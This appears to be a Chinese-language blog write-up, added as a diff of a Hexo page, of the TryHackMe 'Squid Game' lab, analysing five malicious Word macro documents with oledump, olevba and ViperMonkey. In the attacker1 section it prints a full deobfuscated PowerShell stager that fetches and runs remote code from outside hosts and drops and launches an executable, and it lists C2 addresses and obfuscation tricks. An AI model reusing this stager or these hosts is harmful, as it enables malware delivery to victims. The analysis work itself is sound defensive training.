@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="LZ0JOjQQZw7PhvjIbZqeOojf3J6807W7DPn6--OTptc" />
+<meta name="baidu-site-verification" content="code-DDmcbQ6zQN" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <meta name="google-site-verification" content="true">
+  <meta name="msvalidate.01" content="true">
+  <meta name="yandex-verification" content="true">
+  <meta name="baidu-site-verification" content="true">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="恶意宏文件专题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM打靶日寄66-Squid Game">
+<meta property="og:url" content="http://noone40404.github.io/2025/02/26/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8466%EF%BC%9ASquid%20Game/index.html">
+<meta property="og:site_name" content="noone___&#39;s blog">
+<meta property="og:description" content="恶意宏文件专题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be748cd0e0a243d405d314.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be758ed0e0a243d405d334.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be7623d0e0a243d405d351.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be783bd0e0a243d405d3a8.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be8060d0e0a243d405d674.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be81ced0e0a243d405d6be.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6ec7ad0e0a243d40bdeea.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6edced0e0a243d40bdf35.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6f1a5d0e0a243d40bdfd2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6f243d0e0a243d40bdfe5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6f440d0e0a243d40be01d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6f6d1d0e0a243d40be0b4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6fbc9d0e0a243d40be1e3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6fe10d0e0a243d40be27d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6fe67d0e0a243d40be2a1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c6feaad0e0a243d40be2ac.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c703aed0e0a243d40be40c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c702f0d0e0a243d40be3c3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c700b0d0e0a243d40be328.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c70130d0e0a243d40be341.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c7018ed0e0a243d40be358.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c7021ad0e0a243d40be37d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c70be9d0e0a243d40be656.png">
+<meta property="article:published_time" content="2025-02-26T05:10:00.000Z">
+<meta property="article:modified_time" content="2025-03-04T14:19:31.230Z">
+<meta property="article:author" content="noone___">
+<meta property="article:tag" content="THM">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67be748cd0e0a243d405d314.png">
+
+<link rel="canonical" href="http://noone40404.github.io/2025/02/26/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8466%EF%BC%9ASquid%20Game/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>THM打靶日寄66-Squid Game | noone___'s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="noone___'s blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">noone___'s blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/noone40404" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2025/02/26/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8466%EF%BC%9ASquid%20Game/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          THM打靶日寄66-Squid Game
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-26 13:10:00" itemprop="dateCreated datePublished" datetime="2025-02-26T13:10:00+08:00">2025-02-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-04 22:19:31" itemprop="dateModified" datetime="2025-03-04T22:19:31+08:00">2025-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">恶意宏文件专题</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><p>准备工作<br>  点进去发现有五个 <code>doc</code> 文档，分别是 <code>attacker1-5</code> ，可以考虑开一个 <code>python</code>服务器把文件导出来</p>
+<p>  引入一个很好的工具 <code>oledump</code>，其用于分析复合二进制格式的文件 (.doc .xls .ppt) 中包含的数据流，而 .docx .xlsx则是新的文件格式(ZIP内的xml)</p>
+<p>  <a target="_blank" rel="noopener" href="https://blog.didierstevens.com/programs/oledump-py/">作者博客/使用文档</a></p>
+</li>
+</ul>
+<ul>
+<li><p><code>attacker1</code></p>
+<p>  先检查数据流：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67be748cd0e0a243d405d314.png" alt=""></p>
+<p>  其中前面标有 <code>M</code> 的表示该流包含 <code>VBA</code> 宏</p>
+<p>  根据文档，使用 <code>-s [流编号]</code> 输出指定流的内容，<code>-v</code> 输出 <code>vba</code> 宏代码</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67be758ed0e0a243d405d334.png" alt=""></p>
+<p>  那么有宏的流为 <code>8</code> ，名称为 <code>ThisDocument</code></p>
+<p>  可以看到代码被混淆了，扔给ai，分析出来是利用 <code>autoopen()</code> 在word打开时执行powershell指令来下载恶意脚本，其中注意到这句：</p>
+  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trim(<span class="built_in">Replace</span>(pNHbvwXpnbZvS.AlternativeText + &quot;&quot;, &quot;[&quot;, &quot;A&quot;))</span><br></pre></td></tr></table></figure>
+<p>  其将所有 <code>[</code> 替换为 <code>A</code></p>
+<p>  看看别的流，用 <code>-S</code> 仅输出字符串而不输出16进制</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67be7623d0e0a243d405d351.png" alt=""></p>
+<p>  这里有手机号 <code>213-446-1757</code></p>
+<p>  而对于数据流4，其中有一个混淆过的 <code>powershell</code> 命令，而其中恰有一堆 <code>[</code></p>
+<p>  解码一下，注意要删掉零字节：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67be783bd0e0a243d405d3a8.png" alt=""></p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$instance</span> = [<span class="type">System.Activator</span>]::CreateInstance(<span class="string">&quot;System.Net.WebClient&quot;</span>);</span><br><span class="line"><span class="variable">$method</span> = [<span class="type">System.Net.WebClient</span>].GetMethods();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$m</span> <span class="keyword">in</span> <span class="variable">$method</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$m</span>.Name <span class="operator">-eq</span> <span class="string">&quot;DownloadString&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$uri</span> = <span class="built_in">New-Object</span> System.Uri(<span class="string">&quot;http://176.32.35.16/704e.php&quot;</span>)</span><br><span class="line">    <span class="built_in">IEX</span>(<span class="variable">$m</span>.Invoke(<span class="variable">$instance</span>, (<span class="variable">$uri</span>)));</span><br><span class="line">    &#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$m</span>.Name <span class="operator">-eq</span> <span class="string">&quot;DownloadData&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$uri</span> = <span class="built_in">New-Object</span> System.Uri(<span class="string">&quot;http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas&quot;</span>)</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$m</span>.Invoke(<span class="variable">$instance</span>, (<span class="variable">$uri</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$path</span> = [<span class="type">System.Environment</span>]::GetFolderPath(<span class="string">&quot;CommonApplicationData&quot;</span>) + <span class="string">&quot;\\QdZGP.exe&quot;</span>;</span><br><span class="line">    [<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="variable">$path</span>, <span class="variable">$response</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$clsid</span> = <span class="built_in">New-Object</span> Guid <span class="string">&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;</span></span><br><span class="line">    <span class="variable">$type</span> = [<span class="type">Type</span>]::GetTypeFromCLSID(<span class="variable">$clsid</span>)</span><br><span class="line">    <span class="variable">$object</span> = [<span class="type">Activator</span>]::CreateInstance(<span class="variable">$type</span>)</span><br><span class="line">    <span class="variable">$object</span>.Document.Application.ShellExecute(<span class="variable">$path</span>,<span class="variable">$nul</span>, <span class="variable">$nul</span>, <span class="variable">$nul</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Exit</span>;</span><br></pre></td></tr></table></figure>
+<p>  拿到 <code>C2</code> 域中下载的文件 <code>fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas</code> ，想要生成的文件 <code>QdZGP.exe</code>，ip和php页面 <code>176.32.35.16/704e.php</code></p>
+<p>  对于投放的文件夹，显然和 <code>$path = [System.Environment]::GetFolderPath(&quot;CommonApplicationData&quot;) + &quot;\\QdZGP.exe&quot;</code> 有关，搜了一下在 <code>C:\ProgramData</code> ，即 <code>%ProgramData%</code></p>
+<p>  想要连接的 <code>com</code> 的名称借助<a target="_blank" rel="noopener" href="https://strontic.github.io/xcyclopedia/index-com-objects">这个网址</a>搜 <code>clsid</code> 得到: <code>ShellBrowserWindow</code></p>
+<p>  根据 <code>hint</code> 用 <code>olevba</code> 得到 <code>autoexec</code></p>
+<p>  用 <code>file</code> 拿到 <code>subject</code> <del>和日期</del>：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67be8060d0e0a243d405d674.png" alt=""></p>
+<p>  <code>West Virginia Samanta</code></p>
+<p>  日期需要用 <code>oletimes</code> 来看，和 <code>file</code> 看的差30秒</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67be81ced0e0a243d405d6be.png" alt=""></p>
+<p>  <code>2019-02-07 23:45:30</code></p>
+</li>
+<li><p><code>attacker2</code></p>
+<p>  故技重施得到</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6ec7ad0e0a243d40bdeea.png" alt=""></p>
+<p>  携带宏的是 <code>12, 13, 14, 16</code></p>
+<p>  <code>-i</code> 参数输出关于流的信息</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6edced0e0a243d40bdf35.png" alt=""></p>
+<p>  引入另一个工具 <a target="_blank" rel="noopener" href="https://github.com/decalage2/oletools/blob/master/oletools/olevba.py">olevba</a></p>
+<p>  用 <code>grep</code> 读取里面的 <code>fun</code> 内容</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6f1a5d0e0a243d40bdfd2.png" alt=""></p>
+<p>  同样，<code>olevba</code> 末尾的表格会帮你总结出一些东西</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6f243d0e0a243d40bdfe5.png" alt=""></p>
+<p>  两个域名，第一个dll名称和dll个数都在这里</p>
+<p>  继续用 <code>grep &#39;dll&#39;</code> 找到其的路径以及用来运行dll的文件名</p>
+<p>  睡眠时长那里需要 <code>grep &#39;Sleep&#39;</code> 才行</p>
+<p>  从哪个流的话就 <code>grep &#39;stream&#39;</code> ，真是酣畅淋漓的解密啊</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6f440d0e0a243d40be01d.png" alt=""></p>
+</li>
+<li><p><code>attacker3</code></p>
+<p>  要下载的可执行程序名，故技重施 <code>grep &#39;exe&#39;</code></p>
+<p>  让 <code>olevba</code> 分析得到：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6f6d1d0e0a243d40be0b4.png" alt=""></p>
+<p>  即运行1.exe的程序是 <code>certutil</code>，存放到 <code>programdata</code> ，该流VBA/T是 <code>A3</code></p>
+<p>  恶意url那个在LG后面那堆加密的里面，引入一个新工具 <a target="_blank" rel="noopener" href="https://github.com/decalage2/ViperMonkey">vipermonkey</a>，注意用 <code>python2</code> 启动</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6fbc9d0e0a243d40be1e3.png" alt=""></p>
+</li>
+<li><p><code>attacker4</code></p>
+<p>  <code>olevba</code> 看一下，锁定到这里：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6fe10d0e0a243d40be27d.png" alt=""></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/deobfuscating-malicious-macros-using-python/">使用了预定义密钥对字符串进行异或，前者是密文，后者是密钥</a></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6fe67d0e0a243d40be2a1.png" alt=""></p>
+<p>  被丢弃的文件应该是最后一个，那么就是这个</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c6feaad0e0a243d40be2ac.png" alt=""></p>
+<p>  同理得到 <code>\DYIATHUQLCW.exe</code></p>
+<p>  然后 <code>vmonkey</code> 启动：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c703aed0e0a243d40be40c.png" alt=""></p>
+<p>  全秒了。。。</p>
+</li>
+<li><p><code>attacker5</code></p>
+<p>  恶意文档的标题，用 <code>oledump</code> 一个个看：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c702f0d0e0a243d40be3c3.png" alt=""></p>
+<p>  然后直接vmonkey启动，分析出来一长串加密的powershell命令，试了试是base64</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c700b0d0e0a243d40be328.png" alt=""></p>
+<p>  还有加密，再扔回去，自动识别出是 <code>gzip</code> ：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c70130d0e0a243d40be341.png" alt=""></p>
+<p>  异或的十进制：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c7018ed0e0a243d40be358.png" alt=""></p>
+<p>  用这个作为密钥勉强解密出其上面那段powershell命令</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c7021ad0e0a243d40be37d.png" alt=""></p>
+<p>  拿到 <code>C2:176.103.56.89</code> <code>UA:Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)</code> </p>
+<p>  这确实是一个shell文件，需要下到本地用 <code>shellcodedebugger</code> 来做</p>
+<p>  这玩意找了半天只有windows的gui版：<a target="_blank" rel="noopener" href="http://sandsprite.com/CodeStuff/scdbg.zip">http://sandsprite.com/CodeStuff/scdbg.zip</a></p>
+<p>  把下载的 <code>.dat</code> 扔进去，那个 <code>/SjMR</code> 是存的路径。。。</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67c70be9d0e0a243d40be656.png" alt=""></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>noone___
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://noone40404.github.io/2025/02/26/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8466%EF%BC%9ASquid%20Game/" title="THM打靶日寄66-Squid Game">http://noone40404.github.io/2025/02/26/THM打靶日寄66：Squid Game/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/THM/" rel="tag"><i class="fa fa-tag"></i> THM</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/02/22/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8465%EF%BC%9AUranium%20CTF/" rel="prev" title="THM打靶日寄65-Uranium CTF">
+      <i class="fa fa-chevron-left"></i> THM打靶日寄65-Uranium CTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/02/28/noone%E7%9A%84%E9%BB%91%E5%A5%B4%E9%A1%B9%E7%9B%AE%EF%BC%9A%E4%BA%92%E8%81%94%E7%BD%91+%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%A2%84%E6%B5%8B%E6%8A%95%E8%8D%AF%E9%87%8F/" rel="next" title="noone的黑奴项目：互联网+深度学习预测投药量">
+      noone的黑奴项目：互联网+深度学习预测投药量 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="noone___"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">noone___</p>
+  <div class="site-description" itemprop="description">自闭中</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">196</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">81</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noone40404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noone40404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctp314.github.io/" title="https:&#x2F;&#x2F;ctp314.github.io&#x2F;" rel="noopener" target="_blank">CTime_Pup_314</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/guanlexiangfan/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;guanlexiangfan&#x2F;" rel="noopener" target="_blank">Evitagen</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/i-am-zhiyangfan/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;i-am-zhiyangfan&#x2F;" rel="noopener" target="_blank">zhiyangfan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
